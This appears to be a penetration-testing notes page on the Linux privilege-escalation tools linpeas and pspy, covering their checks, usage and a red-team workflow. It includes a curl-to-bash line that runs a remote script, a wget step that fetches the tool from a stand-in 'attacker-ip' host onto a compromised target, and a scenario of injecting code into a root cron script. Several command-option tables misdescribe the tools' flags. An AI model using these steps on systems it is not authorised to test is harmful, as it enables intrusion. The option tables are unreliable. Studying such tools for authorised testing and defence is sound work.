---
title: Automated Tools (Linux)
date: 2026-02-15 21:00:00 +0100
categories: [04-Privilege-Escalation, Linux]
tags: [linpeas, lse, linux-exploit-suggester, privesc]
author: kairos
---

## Linpeas

## **What is `linpeas`?**

`linpeas` (Linux Privilege Escalation Awesome Script) is an automated post-exploitation reconnaissance tool designed to **enumerate potential privilege escalation vectors** on Linux systems. It is part of the PEASS-ng (Privilege Escalation Awesome Scripts Suite) project.

It helps attackers or penetration testers quickly identify misconfigurations, vulnerable binaries, weak permissions, sensitive files, and other exploitable conditions.

**GitHub Repository:**  
[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

## **Primary Usage**

### **Running `linpeas`**

The most common usage:

```bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

Or after manual upload:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

For stealthier or filtered scans:

```bash
./linpeas.sh -a          # Show all checks, even noisy ones
./linpeas.sh -s          # Silent mode, fewer details
./linpeas.sh -h          # Display help and options
```

---

## **Utility of `linpeas`**

`linpeas` performs deep system enumeration, including:

|**Category**|**Examples of Checks**|
|---|---|
|**Kernel & OS Info**|Kernel version, distro, architecture|
|**SUID/SGID Files**|Search for binaries with elevated execution permissions|
|**World-Writable Directories/Files**|Identify risky writable locations|
|**Services & Processes**|Find running services, exposed ports, cron jobs|
|**Users & Groups**|List users, groups, sudoers, environment variables|
|**SSH Keys & Credentials**|Locate private keys, saved passwords, sensitive files|
|**Network Info**|Interfaces, open ports, connections, potential pivot points|
|**Docker & Virtualization**|Detect container escapes or virtualization misconfigurations|
|**NFS & File Systems**|Look for misconfigured mounts or exports|
|**Exploitable Binaries**|Detect common binaries with known local privilege escalations|
|**Password Reuse & Weak Passwords**|Find password hints, history files, common weak configurations|

---

## **Why It's Useful in Red Team and Penetration Tests**

- **Time-Efficient:** Automates hours of manual enumeration.
    
- **Privilege Escalation Focused:** Targets known escalation paths.
    
- **Customizable:** Offers filtered outputs for noisy vs. stealth modes.
    
- **Compatible:** Works across most Linux distributions without dependencies.
    
- **Well-Maintained:** Updated regularly with new privilege escalation techniques.
    

---

## **Typical Red Team Workflow with `linpeas`**

1. **Initial Shell Obtained** — Limited user access.
    
2. **Transfer `linpeas.sh`** to the target:
    
    ```bash
    wget http://attacker-ip/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    
3. **Review Output:** Look for:
    
    - Writable `/etc/passwd` or `/etc/sudoers`
        
    - SUID misconfigurations
        
    - Kernel exploits applicable to version
        
    - Plaintext credentials
        
    - Docker/container weaknesses
        
4. **Exploit Identified Vectors**
    
5. **Privilege Escalation**
    

---

## **Additional Arguments Available**

|**Option**|**Description**|
|---|---|
|`-a`|Show all possible checks, regardless of noise|
|`-s`|Silent mode; minimal output|
|`-h`|Help menu with full options|
|`-m`|Manual mode; interactively run checks|
|`-p`|Specify path to store output|
|`-e`|Exclude certain tests to reduce noise|

---

## **Conclusion**

`linpeas` is a comprehensive, reliable, and fast post-exploitation tool for Linux environments, indispensable in penetration tests and Red Team operations for identifying privilege escalation opportunities in an optimized, systematic manner.

---


---

---

## Pspy

`pspy` is a **privilege escalation reconnaissance tool** designed to monitor processes on a Linux system **without requiring root permissions**. It allows security professionals, Red Team operators, or attackers to detect:

- Scheduled cron jobs
    
- Background scripts
    
- Arbitrary binaries executed by privileged users (e.g., `root`)
    
- Exploitable automated tasks that run with higher privileges
    

`pspy` operates by continuously scanning the `/proc` filesystem to capture process executions in real-time.

**Official Repository:**  
[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

---

## **Typical Usage**

After transferring `pspy` to the target system:

### **Run `pspy` with Default Settings**

```bash
./pspy64
```

Or for 32-bit systems:

```bash
./pspy32
```

This starts monitoring process executions, displaying command-line arguments of each process in real time.

---

## **Utility and Application in Red Team or Pentesting**

|**Purpose**|**Example Scenarios**|
|---|---|
|Detect Scheduled Tasks|Identify cron jobs or timer-based scripts|
|Discover Privileged Executions|Spot processes run by `root` that you may exploit|
|Find Custom Scripts or Binaries|Reveal in-house scripts with weak permissions|
|Expose Passwords or Secrets|Occasionally observe processes revealing credentials|
|Locate Timing Windows for Attacks|Time privilege escalation with precise task execution windows|

**Real-World Example:**

- You run `pspy64` as an unprivileged user.
    
- You notice:
    
    ```bash
    root      0    1234  /bin/bash /opt/scripts/backup.sh
    ```
    
- If `/opt/scripts/backup.sh` is writable by your user, you can inject malicious code.
    
- Upon the next scheduled run, your payload executes with `root` privileges.
    

---

## **Why `pspy` is Effective**

- **No Elevated Privileges Required:** Works as an unprivileged user.
    
- **Monitors `/proc` Directly:** Detects processes beyond the scope of user-specific monitoring.
    
- **Binary with No Installation:** Single executable, portable, minimal footprint.
    
- **Stealthy:** Avoids modifying the system state significantly.
    
- **Real-Time Output:** Immediate visibility of process activity.
    

---

## **Additional Options Available**

|**Option**|**Description**|
|---|---|
|`-p`|Show process tree|
|`-d`|Display debug information|
|`-f`|Show only process executions with full paths|
|`--help`|Display help and usage information|

---

## **Example with Arguments**

```bash
./pspy64 -p -f
```

- Shows process tree structure
    
- Displays full path of binaries being executed
    

---

## **Complementary Tools**

You often pair `pspy` with:

- `linpeas` — For file, permission, and configuration enumeration.
    
- `find` — To check permissions on binaries or scripts discovered by `pspy`.
    
- Manual inspection — Post-discovery to inject payloads or exploit misconfigurations.
    

---

## **Summary**

`pspy` is an essential tool for discovering privilege escalation vectors in real time, monitoring system processes from an unprivileged position. It is widely used during post-exploitation to spot exploitable tasks, making it a critical asset in both Red Team operations and internal security audits.

---


---

---

